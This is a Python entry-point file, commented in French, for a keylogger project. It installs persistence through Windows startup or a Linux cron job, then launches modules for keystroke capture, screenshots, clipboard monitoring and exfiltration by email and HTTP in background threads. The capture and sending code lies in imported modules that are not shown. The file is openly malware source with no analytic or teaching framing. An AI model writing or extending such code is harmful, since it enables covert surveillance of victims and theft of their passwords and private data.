# ============================================================
#  main.py — Point d'entrée unique
#  Lance tous les modules dans le bon ordre
#  Utilisation : python main.py
# ============================================================

import threading
import time
import sys
import os

# ── IMPORTS DES MODULES ──────────────────────────────────────
from storage.logger       import init_db
from core.listener        import KeyLogger
from core.screenshot      import ScreenshotCapture
from core.clipboard       import ClipboardMonitor
from exfil.mailer         import Mailer
from exfil.http_sender    import HttpSender


def install_persistence():
    """Installe la persistance selon l'OS."""
    if sys.platform == "win32":
        from persistence.windows_startup import install, is_installed
    else:
        from persistence.linux_cron import install, is_installed

    if not is_installed():
        install()
    else:
        print("[Persistence] Déjà installé")


def launch_thread(target, name):
    """Helper : lance une fonction dans un thread daemon."""
    t = threading.Thread(target=target, name=name)
    t.daemon = True
    t.start()
    print(f"[+] {name} démarré")
    return t


def main():
    print("=" * 40)
    print("   Keylogger — démarrage")
    print("=" * 40)

    # 1. Persistance
    install_persistence()

    # 2. Base de données
    init_db()
    print("[+] DB prête")

    # 3. Instanciation des modules
    kl  = KeyLogger()
    sc  = ScreenshotCapture()
    cb  = ClipboardMonitor()
    ml  = Mailer()
    hs  = HttpSender()

    # 4. Lancement dans des threads daemon
    launch_thread(kl.start,  "Listener")
    launch_thread(sc.start,  "Screenshot")
    launch_thread(cb.start,  "Clipboard")
    launch_thread(ml.start,  "Mailer")
    launch_thread(hs.start,  "HttpSender")

    print("\n[*] Tout est en marche — Ctrl+C pour arrêter\n")

    # 5. Maintien + arrêt propre
    try:
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[*] Arrêt en cours...")
        kl.stop()
        sc.stop()
        cb.stop()
        ml.stop()
        hs.stop()
        print("[*] Arrêté proprement.")
        sys.exit(0)


if __name__ == "__main__":
    main()